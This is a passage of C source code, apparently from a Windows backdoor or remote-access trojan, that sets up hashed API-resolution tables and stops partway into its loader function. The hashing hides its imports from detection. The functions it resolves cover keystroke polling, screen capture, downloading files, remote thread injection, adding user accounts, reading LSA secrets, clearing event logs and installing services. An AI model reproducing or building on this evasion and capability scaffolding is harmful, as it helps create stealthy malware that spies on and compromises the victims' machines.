#include "Server.h"
#include "Utils.h"
#include "MemoryLoader.h"
#include "ApiBlock.h"

API_BLOCK_KERNEL32 g_Kernel32ApiBlock;
API_BLOCK_USER32 g_User32ApiBlock;
API_BLOCK_NTDLL g_NtdllApiBlock;
API_BLOCK_ADVAPI32 g_AdvApi32ApiBlock;
API_BLOCK_WIN_SOCKET2 g_WinSocket2ApiBlock;
API_BLOCK_SHELL32 g_Shell32ApiBlock;
API_BLOCK_WININET g_WinINetApiBlock;
API_BLOCK_GDI32 g_Gdi32ApiBlock;
API_BLOCK_WTSAPI32 g_WtsApi32Block;
API_BLOCK_PSAPI g_PsApiBlock;
API_BLOCK_URLMON g_UrlMonApiBlock;
API_BLOCK_NETAPI32 g_NetApi32Block;
API_BLOCK_SHLWAPI g_ShlwApiBlock;

HANDLE hKernel32 = INVALID_HANDLE_VALUE;

HMODULE hModuleAdvApi = NULL;
HMODULE hModuleUser32 = NULL;
HMODULE hModuleWinSocket2 = NULL;
HMODULE hModuleShell32 = NULL;
HMODULE hModuleWinINet = NULL;
HMODULE hModuleGdi32 = NULL;
HMODULE hModuleWtsApi32 = NULL;
HMODULE hModulePsApi = NULL;
HMODULE hModuleUrlMon = NULL;
HMODULE hModuleNetApi32 = NULL;
HMODULE hModuleShlwApi = NULL;
//PVOID pAdvApi32Base = NULL;
//PVOID pUser32Base = NULL;
//PVOID pWs2_32Base = NULL;
//PVOID pShell32Base = NULL;

void InitShlwApiHashValue()
{
	g_ShlwApiBlock.ulSHGetValueA_HashValue = 0x174203fa;

	g_ShlwApiBlock.ulSHGetValueW_HashValue = 0x17580410;

	g_ShlwApiBlock.ulSHSetValueA_HashValue = 0x17ae0406;

	g_ShlwApiBlock.ulSHSetValueW_HashValue = 0x17c4041c;


	g_ShlwApiBlock.ulEndApiSaveAddress = 0;
	g_ShlwApiBlock.ulEndApiHashValue = 0;
}
void InitNetApi32HashValue()
{
	g_NetApi32Block.ulNetUserAdd_HashValue = 0x14f803d0;

	g_NetApi32Block.ulNetUserEnum_HashValue = 0x1985045c;

	g_NetApi32Block.ulNetUserGetInfo_HashValue = 0x28610573;

	g_NetApi32Block.ulNetUserSetInfo_HashValue = 0x28b5057f;

	g_NetApi32Block.ulNetUserDel_HashValue = 0x150b03dc;

	g_NetApi32Block.ulNetUserGetGroups_HashValue = 0x34d80667;

	g_NetApi32Block.ulNetUserSetGroups_HashValue = 0x35440673;

	g_NetApi32Block.ulNetUserModalsGet_HashValue = 0x34dd0647;

	g_NetApi32Block.ulNetUserModalsSet_HashValue = 0x35010653;

	g_NetApi32Block.ulNetUserChangePassword_HashValue = 0x59ea0860;

	g_NetApi32Block.ulNetLocalGroupAddMembers_HashValue = 0x69c908f4;

	g_NetApi32Block.ulNetUserGetLocalGroups_HashValue = 0x596c0852;

	g_NetApi32Block.ulNetApiBufferFree_HashValue = 0x3323061e;

	g_NetApi32Block.ulEndApiSaveAddress = 0;
	g_NetApi32Block.ulEndApiHashValue = 0;
}
void InitUrlMonHashValue()
{
	g_UrlMonApiBlock.ulURLDownloadToFileA_HashValue = 0x3f3906b0;

	g_UrlMonApiBlock.ulEndApiSaveAddress = 0;
	g_UrlMonApiBlock.ulEndApiHashValue = 0;
}
void InitPsApiHashValue()
{
	g_PsApiBlock.ulEnumProcessModules_HashValue = 0x441f074e;

	g_PsApiBlock.ulGetModuleFileNameExA_HashValue = 0x4ffb0786;

	g_PsApiBlock.ulEndApiSaveAddress = 0;
	g_PsApiBlock.ulEndApiHashValue = 0;
}
void InitKernel32HashValue()
{
	g_Kernel32ApiBlock.ulGetComputerNameW_HashValue = 0x350b0648;

	g_Kernel32ApiBlock.ulGetSystemDirectoryW_HashValue = 0x4ba307b2;

	g_Kernel32ApiBlock.ulGetWindowsDirectoryW_HashValue = 0x534d0818;

	g_Kernel32ApiBlock.ulCreateFileW_HashValue = 0x18e6042c;

	g_Kernel32ApiBlock.ulReadFile_HashValue = 0x0d2502fd;

	g_Kernel32ApiBlock.ulWriteFile_HashValue = 0x11c8038c;

	g_Kernel32ApiBlock.ulCloseHandle_HashValue = 0x191c0443;

	g_Kernel32ApiBlock.ulCreateThread_HashValue = 0x1df104ad;

	g_Kernel32ApiBlock.ulFindFirstFileW_HashValue = 0x27ec0561;

	g_Kernel32ApiBlock.ulFindNextFileW_HashValue = 0x227604f8;

	g_Kernel32ApiBlock.ulFindClose_HashValue = 0x10b80378;

	g_Kernel32ApiBlock.ulVirtualAlloc_HashValue = 0x1f7004d3;

	g_Kernel32ApiBlock.ulVirtualFree_HashValue = 0x1aab046a;

	g_Kernel32ApiBlock.ulGetFileSize_HashValue = 0x188e043c;

	g_Kernel32ApiBlock.ulGetModuleFileNameW_HashValue = 0x414206df;

	g_Kernel32ApiBlock.ulCreateEventW_HashValue = 0x1ddd04ae;

	g_Kernel32ApiBlock.ulSetFilePointer_HashValue = 0x2860058e;

	g_Kernel32ApiBlock.ulSleep_HashValue = 0x05bd01fa;

	g_Kernel32ApiBlock.ulWideCharToMultiByte_HashValue = 0x4888076a;

	g_Kernel32ApiBlock.ulMultiByteToWideChar_HashValue = 0x4aae076a;

	g_Kernel32ApiBlock.ulCreateMutexW_HashValue = 0x1e3104bf;

	g_Kernel32ApiBlock.ulDefineDosDeviceW_HashValue = 0x33400619;

	g_Kernel32ApiBlock.ulGetFileAttributesW_HashValue = 0x41bc071f;

	g_Kernel32ApiBlock.ulCopyFileW_HashValue = 0x11290373;

	g_Kernel32ApiBlock.ulMoveFileExW_HashValue = 0x1924042c;

	g_Kernel32ApiBlock.ulSetFileAttributesW_HashValue = 0x4294072b;

	g_Kernel32ApiBlock.ulCreateDirectoryW_HashValue = 0x34c50661;

	g_Kernel32ApiBlock.ulGetTickCount_HashValue = 0x1d6c04b5;

	g_Kernel32ApiBlock.ulOpenEventW_HashValue = 0x154303ec;

	g_Kernel32ApiBlock.ulResetEvent_HashValue = 0x158e0406;

	g_Kernel32ApiBlock.ulCancelIo_HashValue = 0x0d2302ff;

	g_Kernel32ApiBlock.ulSetEvent_HashValue = 0x0dcb032f;

	g_Kernel32ApiBlock.ulLoadLibraryW_HashValue = 0x1d9704ad;

	g_Kernel32ApiBlock.ulGetCommandLineW_HashValue = 0x2d8f05bf;

	g_Kernel32ApiBlock.ulCreatePipe_HashValue = 0x14ea03e3;

	g_Kernel32ApiBlock.ulGetStartupInfoA_HashValue = 0x2f3705e1;

	g_Kernel32ApiBlock.ulGetStartupInfoW_HashValue = 0x2f4d05f7;

	g_Kernel32ApiBlock.ulCreateProcessA_HashValue = 0x28b90575;

	g_Kernel32ApiBlock.ulCreateProcessW_HashValue = 0x28cf058b;

	g_Kernel32ApiBlock.ulPeekNamedPipe_HashValue = 0x223104f9;

	g_Kernel32ApiBlock.ulLocalAlloc_HashValue = 0x14aa03d7;

	g_Kernel32ApiBlock.ulLocalFree_HashValue = 0x10e1036e;

	g_Kernel32ApiBlock.ulWaitForMultipleObjects_HashValue = 0x640b08d3;

	g_Kernel32ApiBlock.ulTerminateThread_HashValue = 0x301f0602;

	g_Kernel32ApiBlock.ulTerminateProcess_HashValue = 0x36c70689;

	g_Kernel32ApiBlock.ulWaitForSingleObject_HashValue = 0x49d30776;

	g_Kernel32ApiBlock.ulDisconnectNamedPipe_HashValue = 0x4ac7077e;

	g_Kernel32ApiBlock.ulGetVersionExA_HashValue = 0x23570505;

	g_Kernel32ApiBlock.ulGetVersionExW_HashValue = 0x236d051b;

	g_Kernel32ApiBlock.ulGetSystemInfo_HashValue = 0x23cb0532;

	g_Kernel32ApiBlock.ulGlobalMemoryStatus_HashValue = 0x4322074f;

	g_Kernel32ApiBlock.ulInitializeCriticalSection_HashValue = 0x81f30a13;

	g_Kernel32ApiBlock.ulEnterCriticalSection_HashValue = 0x52a007ff;

	g_Kernel32ApiBlock.ulLeaveCriticalSection_HashValue = 0x517c07ee;

	g_Kernel32ApiBlock.ulDeleteCriticalSection_HashValue = 0x59b00854;

	g_Kernel32ApiBlock.ulCopyMemory_HashValue = 0x23c40547;

	g_Kernel32ApiBlock.ulMoveMemory_HashValue = 0x23cc0543;

	g_Kernel32ApiBlock.ulLocalReAlloc_HashValue = 0x1d1e048e;

	g_Kernel32ApiBlock.ulLocalSize_HashValue = 0x11240387;

	g_Kernel32ApiBlock.ulGetLocalTime_HashValue = 0x1d44049b;

	g_Kernel32ApiBlock.ulGetLogicalDriveStringsA_HashValue = 0x6ade0901;

	g_Kernel32ApiBlock.ulGetVolumeInformationA_HashValue = 0x5bb10860;

	g_Kernel32ApiBlock.ulGetDiskFreeSpaceExA_HashValue = 0x47640718;

	g_Kernel32ApiBlock.ulGetDriveTypeA_HashValue = 0x22cd04fe;

	g_Kernel32ApiBlock.ulFindFirstFileA_HashValue = 0x27d6054b;

	g_Kernel32ApiBlock.ulFindNextFileA_HashValue = 0x226004e2;

	g_Kernel32ApiBlock.ulDeleteFileW_HashValue = 0x18ce042b;

	g_Kernel32ApiBlock.ulDeleteFileA_HashValue = 0x18b80415;

	g_Kernel32ApiBlock.ulRemoveDirectoryW_HashValue = 0x3630067b;

	g_Kernel32ApiBlock.ulRemoveDirectoryA_HashValue = 0x361a0665;

	g_Kernel32ApiBlock.ulCreateFileA_HashValue = 0x18d00416;

	g_Kernel32ApiBlock.ulMoveFileA_HashValue = 0x111f0359;

	g_Kernel32ApiBlock.ulGetFIleAttributesA_HashValue = 0x41a60709;

	g_Kernel32ApiBlock.ulGetWindowsDirectoryA_HashValue = 0x53370802;

	g_Kernel32ApiBlock.ulCreateToolHelp32SnapShot_HashValue = 0x73320951;

	g_Kernel32ApiBlock.ulProcess32First_HashValue = 0x2d2905a4;

	g_Kernel32ApiBlock.ulProcess32Next_HashValue = 0x2794053b;

	g_Kernel32ApiBlock.ulCreateMutexA_HashValue = 0x1e1b04a9;

	g_Kernel32ApiBlock.ulOpenEventA_HashValue = 0x152d03d6;

	g_Kernel32ApiBlock.ulExitProcess_HashValue = 0x1a1e047a;

	g_Kernel32ApiBlock.ulGetSystemDirectoryA_HashValue = 0x4b8d079c;

	g_Kernel32ApiBlock.ulGetLogicalDriveStringsW_HashValue = 0x6af40917;

	g_Kernel32ApiBlock.ulCreateDirectoryA_HashValue = 0x34af064b;

	g_Kernel32ApiBlock.ulCreateDirectoryW_HashValue = 0x34c50661;

	g_Kernel32ApiBlock.ulGetModuleFileNameA_HashValue = 0x412c06c9;

	g_Kernel32ApiBlock.ulGetTempPathA_HashValue = 0x1d770485;

	g_Kernel32ApiBlock.ulMoveFileExA_HashValue = 0x190e0416;

	g_Kernel32ApiBlock.ulCreateEventA_HashValue = 0x1dc70498;

	g_Kernel32ApiBlock.ulOpenProcess_HashValue = 0x19e80472;

	g_Kernel32ApiBlock.ulCreateToolhelp32Snapshot_HashValue = 0x73320951;

	g_Kernel32ApiBlock.ulGetLastError_HashValue = 0x1d9704bf;

	g_Kernel32ApiBlock.ulGetCurrentProcess_HashValue = 0x3c4806e3;

	g_Kernel32ApiBlock.ulHeapAlloc_HashValue = 0x107a036a;

	g_Kernel32ApiBlock.ulHeapReAlloc_HashValue = 0x18140421;

	g_Kernel32ApiBlock.ulHeapFree_HashValue = 0x0d1e0301;

	g_Kernel32ApiBlock.ulHeapSize_HashValue = 0x0d61031a;

	g_Kernel32ApiBlock.ulGetProcessHeap_HashValue = 0x2899057e;

	g_Kernel32ApiBlock.ulGetModuleHandleA_HashValue = 0x33f50614;

	g_Kernel32ApiBlock.ulGlobalMemoryStatusEx_HashValue = 0x52c2080c;

	g_Kernel32ApiBlock.ulWinExec_HashValue = 0x0aad02b4;

	g_Kernel32ApiBlock.ulGetVersion_HashValue = 0x15420407;

	g_Kernel32ApiBlock.ulGetFullPathNameA_HashValue = 0x33790603;

	g_Kernel32ApiBlock.ulGetFullPathNameW_HashValue = 0x338f0619;

	g_Kernel32ApiBlock.ulGetCurrentProcessId_HashValue = 0x4b040790;

	g_Kernel32ApiBlock.ulLoadLibraryA_HashValue = 0x1d810497;

	g_Kernel32ApiBlock.ulGetCurrentThreadId_HashValue = 0x42f40709;

	g_Kernel32ApiBlock.ulModule32FirstW_HashValue = 0x266a052b;

	g_Kernel32ApiBlock.ulModule32NextW_HashValue = 0x214e04c2;

	g_Kernel32ApiBlock.ulGetProcAddress_HashValue = 0x27c7057b;

	g_Kernel32ApiBlock.ulCreateRemoteThread_HashValue = 0x42aa0719;

	g_Kernel32ApiBlock.ulIsBadReadPtr_HashValue = 0x1be10476;

	g_Kernel32ApiBlock.ulVirtualProtect_HashValue = 0x2b0605c9;

	g_Kernel32ApiBlock.ulDeviceIoControl_HashValue = 0x2dbc05ea;

	g_Kernel32ApiBlock.ulFreeLibrary_HashValue = 0x18f20458;

	g_Kernel32ApiBlock.ulGetPrivateProfileStringA_HashValue = 0x76f80985;

	g_Kernel32ApiBlock.ulGetPrivateProfileSectionNamesA_HashValue = 0xb83c0bd7;

	g_Kernel32ApiBlock.ulGlobalSize_HashValue = 0x150403ed;

	g_Kernel32ApiBlock.ulGlobalLock_HashValue = 0x14d203db;

	g_Kernel32ApiBlock.ulGlobalUnlock_HashValue = 0x1e1a04be;

	g_Kernel32ApiBlock.ulGlobalFree_HashValue = 0x14c103d4;

	g_Kernel32ApiBlock.ulGlobalAlloc_HashValue = 0x18f0043d;

	g_Kernel32ApiBlock.ulGetShortPathNameA_HashValue = 0x3b280680;

	g_Kernel32ApiBlock.ulGetEnvironmentVariableA_HashValue = 0x6e07091d;

	g_Kernel32ApiBlock.ulGetEnvironmentVariableW_HashValue = 0x6e1d0933;

	g_Kernel32ApiBlock.ulSetPriorityClass_HashValue = 0x368b0685;

	g_Kernel32ApiBlock.ulSetThreadPriority_HashValue = 0x3c3006e7;

	g_Kernel32ApiBlock.ulGetCurrentThread_HashValue = 0x3546065c;

	g_Kernel32ApiBlock.ulGetCurrentDirectoryA_HashValue = 0x52c007fa;

	g_Kernel32ApiBlock.ulGetCurrentDirectoryW_HashValue = 0x52d60810;


	g_Kernel32ApiBlock.ulEndApiSaveAddress = 0;
	g_Kernel32ApiBlock.ulEndApiHashValue = 0;
}
void InitAdvApi32HashValue()
{
	g_AdvApi32ApiBlock.ulOpenSCManagerW_HashValue = 0x26ad053b;

	g_AdvApi32ApiBlock.ulCreateServiceW_HashValue = 0x28c1057d;

	g_AdvApi32ApiBlock.ulOpenServiceW_HashValue = 0x1ea304bb;

	g_AdvApi32ApiBlock.ulStartServiceW_HashValue = 0x24aa0537;

	g_AdvApi32ApiBlock.ulControlService_HashValue = 0x2a5505b3;

	g_AdvApi32ApiBlock.ulQueryServiceStatusEx_HashValue = 0x55730829;

	g_AdvApi32ApiBlock.ulQueryServiceStatus_HashValue = 0x4599076c;

	g_AdvApi32ApiBlock.ulDeleteService_HashValue = 0x232a0525;

	g_AdvApi32ApiBlock.ulCloseServiceHandle_HashValue = 0x42de0714;

	g_AdvApi32ApiBlock.ulRegOpenKeyW_HashValue = 0x18d20431;

	g_AdvApi32ApiBlock.ulRegSetValueExW_HashValue = 0x27e8055c;

	g_AdvApi32ApiBlock.ulGetUserNameW_HashValue = 0x1db50498;

	g_AdvApi32ApiBlock.ulRegOpenKeyExW_HashValue = 0x224504ee;

	g_AdvApi32ApiBlock.ulRegCloseKey_HashValue = 0x18bf043e;

	g_AdvApi32ApiBlock.ulSetServiceStatus_HashValue = 0x35f70682;

	g_AdvApi32ApiBlock.ulRegisterServiceCtrlHandlerW_HashValue = 0x97380ac1;

	g_AdvApi32ApiBlock.ulStartServiceCtrlDispatcherW_HashValue = 0x979b0ad3;

	g_AdvApi32ApiBlock.ulLockServiceDatabase_HashValue = 0x49c50770;

	g_AdvApi32ApiBlock.ulChangeServiceConfig2W_HashValue = 0x58b407f7;

	g_AdvApi32ApiBlock.ulUnlockServiceDatabase = 0x5bb80853;

	g_AdvApi32ApiBlock.ulDeleteService_HashValue = 0x232a0525;

	g_AdvApi32ApiBlock.ulRegQueryValueExW_HashValue = 0x35340646;

	g_AdvApi32ApiBlock.ulRegOpenKeyExA_HashValue = 0x222f04d8;

	g_AdvApi32ApiBlock.ulRegQueryValueA_HashValue = 0x28fb0573;

	g_AdvApi32ApiBlock.ulRegCreateKeyExA_HashValue = 0x2d05059a;

	g_AdvApi32ApiBlock.ulRegDeleteValueA_HashValue = 0x2d5005b0;

	g_AdvApi32ApiBlock.ulRegDeleteKeyA_HashValue = 0x21f704dc;

	g_AdvApi32ApiBlock.ulRegSetValueExA_HashValue = 0x27d20546;

	g_AdvApi32ApiBlock.ulRegQueryValueExA_HashValue = 0x351e0630;

	g_AdvApi32ApiBlock.ulRegRestoreKeyA_HashValue = 0x28de056d;

	g_AdvApi32ApiBlock.ulRegSaveKeyA_HashValue = 0x18ac0418;

	g_AdvApi32ApiBlock.ulRegQueryInfoKeyA_HashValue = 0x34c9062b;

	g_AdvApi32ApiBlock.ulRegEnumKeyExA_HashValue = 0x223204db;

	g_AdvApi32ApiBlock.ulRegEnumValueA_HashValue = 0x229604f2;

	g_AdvApi32ApiBlock.ulOpenSCManagerA_HashValue = 0x26970525;

	g_AdvApi32ApiBlock.ulOpenServiceA_HashValue = 0x1e8d04a5;

	g_AdvApi32ApiBlock.ulOpenProcessToken_HashValue = 0x35fb0673;

	g_AdvApi32ApiBlock.ulLookupPrivilegeValueA_HashValue = 0x5d940860;

	g_AdvApi32ApiBlock.ulAdjustTokenPrivileges_HashValue = 0x5c540887;

	g_AdvApi32ApiBlock.ulRegCreateKeyA_HashValue = 0x220e04dd;

	g_AdvApi32ApiBlock.ulOpenEventLogA_HashValue = 0x233704f8;

	g_AdvApi32ApiBlock.ulClearEventLogA_HashValue = 0x27d3054d;

	g_AdvApi32ApiBlock.ulCloseEventLog_HashValue = 0x2333051b;

	g_AdvApi32ApiBlock.ulRegSetKeySecurity_HashValue = 0x3abd06cc;

	g_AdvApi32ApiBlock.ulAllocateAndInitializeSid_HashValue = 0x743d096b;

	g_AdvApi32ApiBlock.ulGetLengthSid_HashValue = 0x1d9204a3;

	g_AdvApi32ApiBlock.ulInitializeAcl_HashValue = 0x24030523;

	g_AdvApi32ApiBlock.ulAddAccessAllowedAce_HashValue = 0x464f072d;

	g_AdvApi32ApiBlock.ulInitializeSecurityDescriptor_HashValue = 0xa49c0b8a;

	g_AdvApi32ApiBlock.ulSetSecurityDescriptorDacl_HashValue = 0x82ca0a18;

	g_AdvApi32ApiBlock.ulFreeSid_HashValue = 0x0a5902a3;

	g_AdvApi32ApiBlock.ulRegOpenKeyA_HashValue = 0x18bc041b;

	g_AdvApi32ApiBlock.ulGetTokenInformation_HashValue = 0x4a6f07a8;

	g_AdvApi32ApiBlock.ulLookupAccountSidA_HashValue = 0x3cd006a9;

	g_AdvApi32ApiBlock.ulStartServiceA_HashValue = 0x24940521;

	g_AdvApi32ApiBlock.ulLookupAccountNameA_HashValue = 0x43e4070a;

	g_AdvApi32ApiBlock.ulGetUserNameA_HashValue = 0x1d9f0482;

	g_AdvApi32ApiBlock.ulLsaOpenPolicy_HashValue = 0x22dd0523;

	g_AdvApi32ApiBlock.ulLsaFreeMemory_HashValue = 0x2246051c;

	g_AdvApi32ApiBlock.ulLsaClose_HashValue = 0x0d6a0317;

	g_AdvApi32ApiBlock.ulLsaRetrievePrivateData_HashValue = 0x642508bc;

	g_AdvApi32ApiBlock.ulIsValidSid_HashValue = 0x149a03cd;

	g_AdvApi32ApiBlock.ulAbortSystemShutdownA_HashValue = 0x54b1081b;

	g_AdvApi32ApiBlock.ulAbortSystemShutdownW_HashValue = 0x54c70831;

	g_AdvApi32ApiBlock.ulCreateServiceA_HashValue = 0x28ab0567;

	g_AdvApi32ApiBlock.ulRegCreateKeyExA_HashValue = 0x2d05059a;

	g_AdvApi32ApiBlock.ulRegCreateKeyExW_HashValue = 0x2d1b05b0;

	g_AdvApi32ApiBlock.ulRegSetValueExA_HashValue = 0x27d20546;

	g_AdvApi32ApiBlock.ulRegSetValueExW_HashValue = 0x27e8055c;

	g_AdvApi32ApiBlock.ulRegFlushKey_HashValue = 0x1907044a;



	g_AdvApi32ApiBlock.ulEndApiSaveAddress = 0;
	g_AdvApi32ApiBlock.ulEndApiHashValue = 0;
}
void InitUser32HashValue()
{
	g_User32ApiBlock.ulwsprintfA_HashValue = 0x13ba03bf;

	g_User32ApiBlock.ulwsprintfW_HashValue = 0x13d003d5;

	g_User32ApiBlock.ulGetForegroundWindow_HashValue = 0x4b0d07b4;

	g_User32ApiBlock.ulGetWindowsTextW_HashValue = 0x29080595;

	g_User32ApiBlock.ulGetWindowTextA_HashValue = 0x28f2057f;

	g_User32ApiBlock.ulGetKeyState_HashValue = 0x18ee044b;

	g_User32ApiBlock.ulGetAsyncKeyState_HashValue = 0x343e0649;

	g_User32ApiBlock.ulOpenDesktopA_HashValue = 0x1e4a04ae;

	g_User32ApiBlock.ulOpenDesktopW_HashValue = 0x1e6004c4;

	g_User32ApiBlock.ulCloseDesktop_HashValue = 0x1e2c04d1;

	g_User32ApiBlock.ulOpenInputDesktop_HashValue = 0x35be067d;

	g_User32ApiBlock.ulGetThreadDesktop_HashValue = 0x34170653;

	g_User32ApiBlock.ulGetUserObjectInformationA_HashValue = 0x7f1809de;

	g_User32ApiBlock.ulGetUserObjectInformationW_HashValue = 0x7f2e09f4;

	g_User32ApiBlock.ulSetThreadDesktop_HashValue = 0x34d7065f;

	g_User32ApiBlock.ulPostMessage_HashValue = 0x1f0304ad;

	g_User32ApiBlock.ulGetDesktopWindow_HashValue = 0x34fe0673;

	g_User32ApiBlock.ulReleaseDC_HashValue = 0x11100349;

	g_User32ApiBlock.ulCharNextA_HashValue = 0x10a2035f;

	g_User32ApiBlock.ulCharNextW_HashValue = 0x10b80375;

	g_User32ApiBlock.ulEnumWindows_HashValue = 0x1a0e0481;

	g_User32ApiBlock.ulGetWindowThreadProcessId_HashValue = 0x7627097d;

	g_User32ApiBlock.ulIsWindowVisible_HashValue = 0x2f4e0603;

	g_User32ApiBlock.ulExitWindowsEx_HashValue = 0x244c0543;

	g_User32ApiBlock.ulEnumWindows_HashValue = 0x1a0e0481;

	g_User32ApiBlock.ulSendMessageA_HashValue = 0x1df70491;

	g_User32ApiBlock.ulGetCursorInfo_HashValue = 0x234d052b;

	g_User32ApiBlock.ulDestroyCursor_HashValue = 0x24cb0569;

	g_User32ApiBlock.ulLoadCursorA_HashValue = 0x19390440;

	g_User32ApiBlock.ulLoadCursorW_HashValue = 0x194f0456;

	g_User32ApiBlock.ulSetCursorPos_HashValue = 0x1ed604dd;

	g_User32ApiBlock.ulGetCursorPos_HashValue = 0x1e4604d1;

	g_User32ApiBlock.ulSendMessageW_HashValue = 0x1e0d04a7;

	g_User32ApiBlock.ulBlockInput_HashValue = 0x14ec03fc;

	g_User32ApiBlock.ulGetDC_HashValue = 0x052301a8;

	g_User32ApiBlock.ulSetRect_HashValue = 0x0a9f02bb;

	g_User32ApiBlock.ulGetSystemMetrics_HashValue = 0x360d067d;

	g_User32ApiBlock.ulOpenClipboard_HashValue = 0x233e0523;

	g_User32ApiBlock.ulCloseClipboard_HashValue = 0x28960587;

	g_User32ApiBlock.ulSetClipboardData_HashValue = 0x348a0637;

	g_User32ApiBlock.ulGetClipboardData_HashValue = 0x33ca062b;

	g_User32ApiBlock.ulEmptyClipboard_HashValue = 0x299e05a0;

	g_User32ApiBlock.ulkeybd_event_HashValue = 0x1b2d0491;

	g_User32ApiBlock.ulmouse_event_HashValue = 0x1c1204ab;

	g_User32ApiBlock.ulMapVirtualKeyA_HashValue = 0x29020570;

	g_User32ApiBlock.ulMapVirtualKeyW_HashValue = 0x29180586;

	g_User32ApiBlock.ulSystemParametersInfoA_HashValue = 0x5e050867;

	g_User32ApiBlock.ulSystemParametersInfoW_HashValue = 0x5e1b087d;

	g_User32ApiBlock.ulSetCapture_HashValue = 0x15380401;

	g_User32ApiBlock.ulWindowFromPoint_HashValue = 0x300b0617;



	g_User32ApiBlock.ulEndApiSaveAddress = 0;
	g_User32ApiBlock.ulEndApiHashValue = 0;


	/*
	570		Hash Value: 0x1f0304ad		PostMessageA
	571		Hash Value: 0x1f1904c3		PostMessageW
	*/
}
void InitWs2_32HashValue()
{
	g_WinSocket2ApiBlock.ulWSAStartup_HashValue = 0x13c303df;

	g_WinSocket2ApiBlock.ulWSAIoctl_HashValue = 0x0c3102e7;

	g_WinSocket2ApiBlock.ulGetHostByName_HashValue = 0x267e057b;

	g_WinSocket2ApiBlock.ulSocket_HashValue = 0x08ee028a;

	g_WinSocket2ApiBlock.ulConnect_HashValue = 0x0b9d02eb;

	g_WinSocket2ApiBlock.ulhtons_HashValue = 0x0679022d;

	g_WinSocket2ApiBlock.ulSetSockOpt_HashValue = 0x17b00450;

	g_WinSocket2ApiBlock.ulclosesocket_HashValue = 0x1bae04a0;

	g_WinSocket2ApiBlock.ulselect_HashValue = 0x08ca0281;

	g_WinSocket2ApiBlock.ulrecv_HashValue = 0x043701b1;

	g_WinSocket2ApiBlock.ulgetsockname_HashValue = 0x1ba20492;

	g_WinSocket2ApiBlock.ulgethostname_HashValue = 0x1bd704a0;

	g_WinSocket2ApiBlock.ulsend_HashValue = 0x043f01ab;

	g_WinSocket2ApiBlock.ulWSACleanup_HashValue = 0x12e103b4;

	g_WinSocket2ApiBlock.ulWSAGetLastError_HashValue = 0x2a8a05aa;

	g_WinSocket2ApiBlock.ul__WSAFDIsSet_HashValue = 0x19e0041c;

	g_WinSocket2ApiBlock.ulaccept_HashValue = 0x084a0271;

	g_WinSocket2ApiBlock.ulbind_HashValue = 0x0407019e;

	g_WinSocket2ApiBlock.ullisten_HashValue = 0x08fb0290;

	g_WinSocket2ApiBlock.ulinet_addr_HashValue = 0x126a03ab;

	g_WinSocket2ApiBlock.ulgetpeername_HashValue = 0x1b73048e;

	g_WinSocket2ApiBlock.ulrecvfrom_HashValue = 0x0f340365;

	g_WinSocket2ApiBlock.ulinet_ntoa_HashValue = 0x12d303c2;

	g_WinSocket2ApiBlock.ulntohs_HashValue = 0x068b022d;

	g_WinSocket2ApiBlock.ulsendto_HashValue = 0x08ec028e;

	g_WinSocket2ApiBlock.ulioctlsocket_HashValue = 0x1bdb04a5;



	g_WinSocket2ApiBlock.ulEndApiSaveAddress = 0;
	g_WinSocket2ApiBlock.ulEndApiHashValue = 0;
}
void InitShell32HashValue()
{
	g_Shell32ApiBlock.ulSHGetSpecialFolderPathW_HashValue = 0x667708bd;

	g_Shell32ApiBlock.ulCommandLineToArgvW_HashValue = 0x41bd06f2;

	g_Shell32ApiBlock.ulSHGetFileInfoA_HashValue = 0x24f90509;

	g_Shell32ApiBlock.ulShellExecuteA_HashValue = 0x2377050d;

	g_Shell32ApiBlock.ulSHGetSpecialFolderPathA_HashValue = 0x666108a7;

	g_Shell32ApiBlock.ulShellExecuteExA_HashValue = 0x2ece05ca;

	g_Shell32ApiBlock.ulShellExecuteExW_HashValue = 0x2ee405e0;

	g_Shell32ApiBlock.ulSHChangeNotify_HashValue = 0x25ce055b;
	
	g_Shell32ApiBlock.ulEndApiSaveAddress = 0;
	g_Shell32ApiBlock.ulEndApiHashValue = 0;
}
void InitWinINetHashValue()
{
	g_WinINetApiBlock.ulInternetOpenW_HashValue = 0x24720533;

	g_WinINetApiBlock.ulInternetOpenUrlW_HashValue = 0x36880666;

	g_WinINetApiBlock.ulInternetReadFile_HashValue = 0x35c00646;

	g_WinINetApiBlock.ulInternetCloseHandle_HashValue = 0x4b92078c;

	g_WinINetApiBlock.ulInternetOpenA_HashValue = 0x245c051d;

	g_WinINetApiBlock.ulInternetOpenUrlA_HashValue = 0x36720650;

	g_WinINetApiBlock.ulEndApiSaveAddress = 0;
	g_WinINetApiBlock.ulEndApiHashValue = 0;
}
void InitWtsApi32HashValue()
{
	g_WtsApi32Block.ulWTSQuerySessionInformationW_HashValue = 0x94a90ad6;

	g_WtsApi32Block.ulWTSQuerySessionInformationA_HashValue = 0x94930ac0;

	g_WtsApi32Block.ulWTSLogoffSession_HashValue = 0x32c40640;

	g_WtsApi32Block.ulWTSDisconnectSession_HashValue = 0x4ff407ed;

	g_WtsApi32Block.ulWTSFreeMemory_HashValue = 0x20c704fa;

	g_WtsApi32Block.ulWTSEnumerateSessionsA_HashValue = 0x58ba083d;


	g_WtsApi32Block.ulEndApiSaveAddress = 0;
	g_WtsApi32Block.ulEndApiHashValue = 0;
}
void InitGdi32HashValue()
{
	g_Gdi32ApiBlock.ulCreateDIBSection_HashValue = 0x315a05f9;

	g_Gdi32ApiBlock.CreateCompatibleBitmap_HashValue = 0x629608b2;

	g_Gdi32ApiBlock.ulBitBlt_HashValue = 0x07810242;

	g_Gdi32ApiBlock.ulSelectObject_HashValue = 0x1e2504b8;

	g_Gdi32ApiBlock.ulCreateCompatibleDC_HashValue = 0x422b06dc;

	g_Gdi32ApiBlock.ulDeleteDC_HashValue = 0x0d3602db;

	g_Gdi32ApiBlock.ulDeleteObject_HashValue = 0x1d9004ab;

	g_Gdi32ApiBlock.ulGetDIBits_HashValue = 0x0f7f0340;

	g_Gdi32ApiBlock.ulEndApiSaveAddress = 0;
	g_Gdi32ApiBlock.ulEndApiHashValue = 0;
}
BOOLEAN InitializeApiBlock()
{
	BOOLEAN bRet;
	PVOID pKernel32Base;
	PVOID pFileDat;
	ULONG ulSize;
	MEMORY_LOADER Krl32Ldr;
	WCHAR wLdrPath[MAX_PATH];

	pKernel32Base = NULL;
	bRet = FALSE;
	pFileDat = NULL;
	ulSize = 0;

	do 
	{
		CleanZero((PCHAR)&g_Kernel32ApiBlock,sizeof(API_BLOCK_KERNEL32));
		if (INVALID_HANDLE_VALUE == hKernel32)
		{
			hKernel32 = GetLdrDllHandle(L"kernel32.dll");
			if (hKernel32)
			{
